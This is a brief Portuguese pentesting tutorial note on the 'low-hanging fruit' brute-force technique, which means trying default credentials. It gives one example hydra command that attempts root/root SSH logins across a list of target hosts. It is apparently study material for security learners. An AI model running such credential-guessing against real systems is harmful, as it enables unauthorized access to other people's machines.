<h1 align="center">Realizando um ataque na rede - Low-Hanging Fruit </h1>
<hr>

Outra tecnica interessante que a gente pode implementar em brute force eh o Low Hanging Fruit .

Buscar os pontos mais fracos e faceis (Ex: credenciais default)

Exemplo didatico:

```sh
hydra -v -l root -p root -M targets/24 ssh
```